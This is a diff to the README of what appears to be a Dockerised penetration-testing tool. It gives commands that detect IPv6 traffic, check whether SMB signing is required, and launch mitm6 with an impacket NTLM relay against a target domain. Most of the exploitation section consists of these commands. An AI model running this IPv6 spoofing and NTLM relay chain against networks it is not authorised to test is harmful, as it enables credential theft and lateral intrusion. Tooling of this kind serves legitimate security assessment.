@@ -2,30 +2,31 @@
 
 ## Discovery
 
-First check of IPv6 is being used on the network:
+First check if IPv6 is being used on the network:
 
 ```bash
-tshark -i interface -f "ip6" 
+screen -S tshark -d -m docker run --network host -v -it "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
+check_for_ipv6_traffic network_interface to listen on
 ```
+
 If packets are flowing then the next step is to check if SMB signing is not required.
 To discover if SMB is enabled but not required, run (edit to match folder)
 
 ```bash
 docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
-check_if_smb_is_required IP_ADDRESS
+check_if_smb_is_required target_ip_address_or_list_of_ips
 ```
 
 ## Exploitation
 
 If SMB is not required then:
 
-Setup mitm6 and ntlm relay
 ```bash
-sudo ./start_nltm_relay_ipv6.sh target_doman target_or_target_files
+screen -S mitm6 -d -m  docker run -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
+start_mitm6 target_domain_name local_network_interface
 ```
 
-The above command runs mitm6 and impacket relay in two screens, you can view the
-running screens using:
+The above command runs mitm6 and impacket relay in two screens, you can view the running screens using:
 
 ```bash
 screen -ls
